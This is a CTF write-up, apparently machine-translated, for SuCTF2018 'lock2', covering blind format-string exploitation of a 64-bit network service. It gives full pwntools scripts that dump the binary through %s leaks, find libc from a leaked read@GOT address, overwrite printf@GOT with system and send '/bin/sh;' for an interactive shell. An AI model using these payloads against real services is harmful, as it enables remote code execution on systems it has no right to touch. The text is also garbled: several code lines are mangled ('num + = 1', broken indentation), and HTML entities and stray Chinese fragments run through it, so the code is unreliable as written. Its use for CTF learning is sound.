By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit.


```shell

➜  blind_fmt_got git:(master) ✗ nc localhost 9999

%p

0x7fff3b9774c0
```



This time, I didn&#39;t show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs.


#### Determining the offset


Before the leak procedure, we still have to determine the offset of the format string, as follows


```shell

➜  blind_fmt_got git:(master) ✗ nc localhost 9999

aaaaaaaa%p%p%p%p%p%p%p%p%p

aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025

```



Based on this, we can know that the starting address offset of the format string is 6.


#### leaking binary


Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the &#39;\x00&#39; character, otherwise it can&#39;t be revealed how to play, after that, the output must be truncated by &#39;\x00&#39;, this is because The output functions of the format string exploit are truncated by &#39;\x00&#39;. . So we can use the leak code below.


```python

##coding=utf8

from pwn import *



##context.log_level = 'debug'

ip = "127.0.0.1"

port = 9999





def leak(addr):

    # leak addr for three times

num = 0
    while num < 3:

        try:

            print 'leak addr: ' + hex(addr)

            sh = remote(ip, port)

            payload = '%00008$s' + 'STARTEND' + p64(addr)

#说明有\n, a new line appears
            if '\x0a' in payload:

                return None

            sh.sendline(payload)

            data = sh.recvuntil('STARTEND', drop=True)

            sh.close()

            return data

        except Exception:

num + = 1
            continue

    return None



def getbinary():

	addr = 0x400000

	f = open('binary', 'w')

	while addr < 0x401000:

		data = leak(addr)

		if data is None:

			f.write('\xff')

			addr += 1

elif len (data) == 0:
			f.write('\x00')

			addr += 1

		else:

			f.write(data)

addr + = len (data)
	f.close()

getbinary()

```



It should be noted that in the payload, it is necessary to judge whether or not &#39;\n&#39; appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address.


####分析斌ary


Use IDA to open the leaked binary, change the program base address, and then simply look at it, you can basically determine the address of the source program main function.


`` `asm
seg000:00000000004005F6                 push    rbp

seg000:00000000004005F7                 mov     rbp, rsp

seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h

seg000:00000000004005FE

seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j

seg000:00000000004005FE                 lea     rax, [rbp-80h]

seg000:0000000000400602                 mov     edx, 80h ; '€'

seg000:0000000000400607                 mov     rsi, rax

seg000: 000000000040060A mov edi, 0
seg000:000000000040060F                 mov     eax, 0

seg000:0000000000400614                 call    sub_4004C0

seg000:0000000000400619                 lea     rax, [rbp-80h]

seg000: 000000000040061D mov rdi, rax
seg000:0000000000400620                 mov     eax, 0

seg000:0000000000400625                 call    sub_4004B0

seg000:000000000040062A                 mov     rax, cs:601048h

seg000: 0000000000400631 mov rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0

seg000:0000000000400639                 jmp     short loc_4005FE

```



It can be basically determined that sub\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing.


#### Using ideas


After analyzing the above, we can determine the following basic ideas


- leak the address of the printf function,
- Get the corresponding libc and system function address
- Modify printf address to system function address
- Read /bin/sh; to get the shell


#### Using the program


The procedure is as follows.

```python

##coding=utf8

import math

from pwn import *

from LibcSearcher import LibcSearcher

##context.log_level = 'debug'

context.arch = 'amd64'

ip = "127.0.0.1"

port = 9999





def leak(addr):

    # leak addr for three times

num = 0
    while num < 3:

        try:

            print 'leak addr: ' + hex(addr)

            sh = remote(ip, port)

            payload = '%00008$s' + 'STARTEND' + p64(addr)

#说明有\n, a new line appears
            if '\x0a' in payload:

                return None

            sh.sendline(payload)

            data = sh.recvuntil('STARTEND', drop=True)

            sh.close()

            return data

        except Exception:

num + = 1
            continue

    return None





def getbinary():

    addr = 0x400000

    f = open('binary', 'w')

    while addr < 0x401000:

        data = leak(addr)

        if data is None:

            f.write('\xff')

            addr += 1

elif len (data) == 0:
            f.write('\x00')

            addr += 1

        else:

            f.write(data)

addr + = len (data)
    f.close()





##getbinary()

read_got = 0x601020

printf_got = 0x601018

sh = remote(ip, port)

## let the read get resolved

sh.sendline('a')

sh.recv()

## get printf addr

payload = '%00008$s' + 'STARTEND' + p64(read_got)

sh.sendline(payload)

data = sh.recvuntil (&#39;STARTEND&#39;, drop = True) .ljust (8, &#39;x00&#39;)
sh.recv()

read_addr = u64(data)



## get system addr

libc = LibcSearcher('read', read_addr)

libc_base = read_addr - libc.dump('read')

system_addr = libc_base + libc.dump('system')

log.success('system addr: ' + hex(system_addr))

log.success('read   addr: ' + hex(read_addr))

## modify printf_got

payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')

## get all the addr

addr = payload[:32]

payload = '%32d' + payload[32:]

offset = (int)(math.ceil(len(payload) / 8.0) + 1)

for i in range(6, 10):

    old = '%{}$'.format(i)

    new = '%{}$'.format(offset + i)

    payload = payload.replace(old, new)

remainer = len(payload) % 8

payload += (8 - remainer) * 'a'

payload += addr

sh.sendline(payload)

sh.recv()



## get shell

sh.sendline('/bin/sh;')

sh.interactive()

```



What needs to be noted here is this code.


```python

## modify printf_got

payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')

## get all the addr

addr = payload[:32]

payload = '%32d' + payload[32:]

offset = (int)(math.ceil(len(payload) / 8.0) + 1)

for i in range(6, 10):

    old = '%{}$'.format(i)

    new = '%{}$'.format(offset + i)

    payload = payload.replace(old, new)

remainer = len(payload) % 8

payload += (8 - remainer) * 'a'

payload += addr

sh.sendline(payload)

sh.recv()

```



Fmtstr\_payload directly get the payload will put the address in front, and this will lead to &#39;\x00&#39; truncation of printf (**About this problem, pwntools is currently developing an enhanced version of fmt\_payload, it is estimated that it will be developed soon **). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is


```python

offset = (int)(math.ceil(len(payload) / 8.0) + 1)

```



This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of &#39;%order$hn&#39; will not be greater than 8. Specific can be deduced by yourself.


### Title
- SuCTF2018 - lock2 (The organizer provided the docker image: suctf/2018-pwn-lock2)